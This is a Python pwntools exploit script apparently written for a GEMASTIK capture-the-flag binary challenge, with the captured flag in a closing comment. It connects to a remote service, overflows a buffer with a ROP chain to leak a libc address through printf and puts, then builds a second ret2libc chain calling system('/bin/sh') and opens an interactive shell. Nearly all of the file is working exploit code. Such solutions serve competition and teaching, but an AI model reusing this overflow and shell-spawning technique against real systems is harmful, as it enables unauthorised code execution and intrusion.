#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = 'debug'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("13.214.217.75",2002)

    return r


def main():
    r = conn()
    sweetheart = "-1000080582865125373"
    sleep(3)
    r.sendline(sweetheart)
    offset = 120 - 8
    rop = ROP(exe)
    rop.raw(b"A" * offset)
    rop.raw(0x404900)
    rop.raw(0x0000000000401016)
    rop.raw(exe.plt['printf'])
    rop.raw(exe.plt['puts'])
    rop.raw(0x0000000000401016)
    rop.raw(0x00000000004013b5)
    r.sendline(rop.chain())
    r.sendline("5260204374156574724")
    print(r.recv(575 + 51))
    print(r.recv(0x68))
    print(r.recv(61))
    fun_lock = r.recv(6)
    print(f"leaked : {fun_lock}" )
    addr = u64(fun_lock + b"\x00\x00")
    print(hex(addr))
    libc.address = addr - 0x62050
    log.info(f"base libc : {hex(libc.address)}")
    print("===============")
    print(hex(libc.address))
    rop2 = ROP(libc)
    rop2.raw(b"A" * offset)
    rop2.raw(exe.bss() + 0x800)
    rop2.raw(libc.address + 0x000000000002a2e0)
    rop2.raw(0x404900)
    rop2.raw(libc.address + 0x000000000002a3e5)
    rop2.raw(next(libc.search(b"/bin/sh\x00")))
    rop2.raw(0x0000000000401016)
    rop2.raw(libc.sym['system'])
    # # sleep(3)
    r.sendline(rop2.chain())
    # print(rop2.dump())
    r.sendline("5260204374156574724")
    
    # # # good luck pwning :)

    r.interactive()
    # print(int(libc.address + 0x000000000002a2e0))


if __name__ == "__main__":
    main()

# flag : GEMASTIK{i__want__to__know__her__more__even__though__she's__right__here💔💔💔}